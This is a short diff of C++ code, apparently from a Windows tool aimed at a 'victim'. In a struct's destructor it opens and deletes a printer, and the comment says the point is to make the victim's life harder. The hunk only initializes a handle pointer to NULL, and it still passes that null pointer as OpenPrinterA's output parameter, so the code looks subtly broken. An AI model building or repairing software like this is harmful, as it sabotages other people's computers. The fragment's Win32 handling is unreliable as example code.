@@ -35,7 +35,7 @@ struct PrinterInformations {
 
 	~PrinterInformations(){
 		//Delete Printer from list to make the life of the victim harder lel.
-		LPHANDLE hPrinter;
+		LPHANDLE hPrinter = NULL;
 		if(OpenPrinterA((LPSTR)this->PrinterName.c_str(), hPrinter, NULL) != 0){
 			//If the function succeed and we have a handle on the current printer
 			//Try to delete the printer.
